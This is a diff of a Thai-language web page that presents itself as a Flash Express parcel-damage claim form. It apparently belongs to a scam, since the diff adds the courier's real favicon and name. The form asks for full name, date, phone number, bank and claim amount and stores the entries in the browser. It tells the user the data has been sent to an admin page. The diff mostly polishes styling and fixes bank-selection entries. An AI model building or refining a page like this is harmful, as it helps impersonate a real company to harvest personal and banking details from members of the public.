@@ -2,8 +2,8 @@
 <html lang="th">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>FLASH | ยื่นเคลมพัสดุเสียหาย</title>
+<link rel="icon" href="https://flashexpress.com/favicon.ico" type="image/x-icon">
+<title>Flash Express</title>
   <link href="https://fonts.googleapis.com/css2?family=Prompt:wght@400;600&display=swap" rel="stylesheet">
   <style>
     body {
@@ -32,7 +32,7 @@
       font-weight: 600;
     }
 
-    /* 🎯 จัดขนาด input ทุกช่องให้เท่ากัน */
+    /* 🎯 ช่อง input ทุกช่องเท่ากัน */
     input, .custom-select {
       width: 100%;
       padding: 10px;
@@ -44,60 +44,57 @@
       box-sizing: border-box;
     }
 
-/* ✅ dropdown ธนาคาร */
-.custom-select {
-  position: relative;
-  cursor: pointer;
-  background-color: #fff;
-  border: 1px solid #ccc;
-  border-radius: 8px;
-  margin-bottom: 12px;
-  width: 100%;
-  height: 42px; /* ✅ กำหนดความสูงให้เท่ากับ input */
-  box-sizing: border-box;
-}
+    /* ✅ dropdown ธนาคาร */
+    .custom-select {
+      position: relative;
+      cursor: pointer;
+      background-color: #fff;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      height: 42px;
+      box-sizing: border-box;
+    }
 
-.selected-option {
-  display: flex;
-  justify-content: space-between;
-  align-items: center;
-  height: 100%;
-  padding: 0 10px; /* ✅ ลด padding ให้พอดี */
-  font-size: 15px;
-}
+    .selected-option {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      height: 100%;
+      padding: 0 10px;
+      font-size: 15px;
+    }
 
-.option-list {
-  display: none;
-  position: absolute;
-  top: calc(100% + 3px); /* เลื่อนลงเล็กน้อย */
-  left: 0;
-  right: 0;
-  background: white;
-  border: 1px solid #ccc;
-  border-radius: 8px;
-  max-height: 200px;
-  overflow-y: auto;
-  z-index: 10;
-}
+    .option-list {
+      display: none;
+      position: absolute;
+      top: calc(100% + 3px);
+      left: 0;
+      right: 0;
+      background: white;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      max-height: 200px;
+      overflow-y: auto;
+      z-index: 10;
+    }
 
-.option-item {
-  display: flex;
-  align-items: center;
-  padding: 8px 10px;
-  transition: background 0.2s;
-}
+    .option-item {
+      display: flex;
+      align-items: center;
+      padding: 8px 10px;
+      transition: background 0.2s;
+    }
 
-.option-item img {
-  width: 24px;
-  height: 24px;
-  border-radius: 50%;
-  margin-right: 10px;
-}
+    .option-item img {
+      width: 24px;
+      height: 24px;
+      border-radius: 50%;
+      margin-right: 10px;
+    }
 
-.option-item:hover {
-  background-color: #f5f5f5;
-}
-
+    .option-item:hover {
+      background-color: #f5f5f5;
+    }
 
     /* ปุ่ม */
     .btn-box {
@@ -114,6 +111,7 @@
       width: 48%;
       font-size: 15px;
       cursor: pointer;
+      transition: all 0.1s ease;
     }
 
     .btn-submit {
@@ -133,6 +131,11 @@
       background: #f5f5f5;
     }
 
+    /* ✨ เอฟเฟกต์ปุ่มเด้งเบาๆ */
+    button:active {
+      transform: scale(0.95);
+      transition: transform 0.1s ease;
+    }
   </style>
 </head>
 <body>
@@ -143,7 +146,6 @@
     <input type="text" id="fullname" placeholder="ชื่อ - นามสกุล">
     <input type="date" id="date" placeholder="ว/ด/ป">
     <input type="text" id="phone" placeholder="เบอร์โทร">
-    <input type="text" id="address" placeholder="ที่อยู่">
 
     <!-- ✅ dropdown ธนาคาร -->
     <div class="custom-select" id="bankSelect">
@@ -158,61 +160,61 @@
         <div class="option-item" onclick="selectBank('BBL', 'กรุงเทพ (BBL)', 'BBL.jpeg')">
           <img src="BBL.jpeg" alt=""> กรุงเทพ (BBL)
         </div>
-        <div class="option-item" onclick="selectBank('KTB', 'กรุงไทย (KTB)', 'KTB.png')">
+        <div class="option-item" onclick="selectBank('KTB', 'กรุงไทย (KTB)', 'KTB.jpeg')">
           <img src="KTB.jpeg" alt=""> กรุงไทย (KTB)
         </div>
-        <div class="option-item" onclick="selectBank('KBANK', 'กสิกรไทย (KBANK)', 'KBANK.png')">
+        <div class="option-item" onclick="selectBank('KBANK', 'กสิกรไทย (KBANK)', 'KBANK.jpeg')">
           <img src="KBANK.jpeg" alt=""> กสิกรไทย (KBANK)
         </div>
-        <div class="option-item" onclick="selectBank('SCB', 'ไทยพาณิชย์ (SCB)', 'SCB.png')">
+        <div class="option-item" onclick="selectBank('SCB', 'ไทยพาณิชย์ (SCB)', 'SCB.jpeg')">
           <img src="SCB.jpeg" alt=""> ไทยพาณิชย์ (SCB)
         </div>
         <div class="option-item" onclick="selectBank('GSB', 'ออมสิน (GSB)', 'GSB.png')">
           <img src="GSB.png" alt=""> ออมสิน (GSB)
         </div>
-        <div class="option-item" onclick="selectBank('CIMB', 'CIMB (CIMB)', 'GSB.CIMB')">
+        <div class="option-item" onclick="selectBank('CIMB', 'ซีไอเอ็มบี (CIMB)', 'CIMB.jpeg')">
           <img src="CIMB.jpeg" alt=""> ซีไอเอ็มบี (CIMB)
         </div>
-        <div class="option-item" onclick="selectBank('KKP', 'เกียรตินาคิน (KKP)', 'KKP')">
+        <div class="option-item" onclick="selectBank('KKP', 'เกียรตินาคิน (KKP)', 'KKP.jpeg')">
           <img src="KKP.jpeg" alt=""> เกียรตินาคิน (KKP)
         </div>
-        <div class="option-item" onclick="selectBank('TTB', 'ทหารไทยธนชาต (TTB)', 'TTB')">
+        <div class="option-item" onclick="selectBank('TTB', 'ทหารไทยธนชาต (TTB)', 'TTB.jpeg')">
           <img src="TTB.jpeg" alt=""> ทหารไทยธนชาต (TTB)
         </div>
-         <div class="option-item" onclick="selectBank('GHB', 'อาคารสงเคราะห์ (GHB)', 'GHB')">
+        <div class="option-item" onclick="selectBank('GHB', 'อาคารสงเคราะห์ (GHB)', 'GHB.jpg')">
           <img src="GHB.jpg" alt=""> อาคารสงเคราะห์ (GHB)
         </div>
-        <div class="option-item" onclick="selectBank('TTB', 'ยูโอบี (UOB)', 'UOB')">
+        <div class="option-item" onclick="selectBank('UOB', 'ยูโอบี (UOB)', 'UOB.jpg')">
           <img src="UOB.jpg" alt=""> ยูโอบี (UOB)
         </div>
       </div>
     </div>
 
-    <input type="text" id="account" placeholder="เลขบัญชีธนาคาร">
     <input type="number" id="amount" placeholder="จำนวนเงินที่ต้องการเคลม">
 
     <div class="btn-box">
       <button class="btn-submit" onclick="submitClaim()">การยื่นคำร้อง</button>
-      <button class="btn-cancel" onclick="cancelClaim()">ยกเลิก</button>
+      <button class="btn-cancel" onclick="goHome()">🏠 กลับหน้าหลัก</button>
     </div>
   </div>
 
   <script>
-    // แสดง / ซ่อน dropdown
+    let selectedBank = "";
+
+    // 🔽 แสดง / ซ่อน dropdown
     function toggleOptions() {
       const list = document.getElementById("bankOptions");
       list.style.display = list.style.display === "block" ? "none" : "block";
     }
 
-    // เมื่อเลือกธนาคาร
+    // 🔽 เมื่อเลือกธนาคาร
     function selectBank(value, text, logo) {
       document.getElementById("selectedBankText").innerHTML = `
         <img src="${logo}" alt="" style="width:24px;height:24px;border-radius:50%;vertical-align:middle;margin-right:8px;">
         ${text}
       `;
-      document.getElementById("bank").value = value;
+      selectedBank = text;
       document.getElementById("bankOptions").style.display = "none";
-      selectedBank = value;
     }
 
     // ✅ ยื่นคำร้อง
@@ -220,40 +222,39 @@
       const name = document.getElementById("fullname").value.trim();
       const date = document.getElementById("date").value;
       const phone = document.getElementById("phone").value.trim();
-      const address = document.getElementById("address").value.trim();
-      const account = document.getElementById("account").value.trim();
       const amount = document.getElementById("amount").value.trim();
-      const bank = selectedBank || "";
+      const bank = selectedBank;
 
-      if (!name || !date || !phone || !address || !bank || !account || !amount) {
+      if (!name || !date || !phone || !bank || !amount) {
         alert("⚠️ กรุณากรอกข้อมูลให้ครบทุกช่อง");
         return;
       }
 
-      const claims = JSON.parse(localStorage.getItem("claims")) || [];
+      let claims = JSON.parse(localStorage.getItem("claim_requests")) || [];
       claims.push({
-        name, date, phone, address, bank, account, amount,
+        name,
+        date,
+        phone,
+        bank,
+        amount,
+        status: "รอตรวจสอบ",
         submitted: new Date().toLocaleString("th-TH")
       });
-      localStorage.setItem("claims", JSON.stringify(claims));
+      localStorage.setItem("claim_requests", JSON.stringify(claims));
 
-      alert("✅ ยื่นคำร้องสำเร็จ! ระบบบันทึกข้อมูลเรียบร้อยแล้ว");
-      document.querySelectorAll("input").forEach(el => el.value = "");
-      document.getElementById("selectedBankText").textContent = "เลือกธนาคาร";
-      selectedBank = "";
+      alert("✅ ยื่นคำร้องสำเร็จ! ระบบส่งข้อมูลไปยังหน้าแอดมินแล้ว");
+      window.location.href = "claim-success.html"; // ไปหน้าแจ้งเตือนสำเร็จ
     }
 
-    // 🧹 ยกเลิก
-    function cancelClaim() {
-      if (confirm("ต้องการยกเลิกการกรอกข้อมูลหรือไม่?")) {
-        document.querySelectorAll("input").forEach(el => el.value = "");
-        document.getElementById("selectedBankText").textContent = "เลือกธนาคาร";
-        selectedBank = "";
-      }
+    // 🏠 กลับหน้าหลัก พร้อมเอฟเฟกต์โหลดนุ่มๆ
+    function goHome() {
+      const btn = document.querySelector(".btn-cancel");
+      btn.textContent = "🔄 กำลังกลับ...";
+      btn.style.opacity = "0.7";
+      setTimeout(() => {
+        window.location.href = "index.html"; // หน้าหลัก
+      }, 800);
     }
-
-    let selectedBank = "";
   </script>
-
 </body>
 </html>
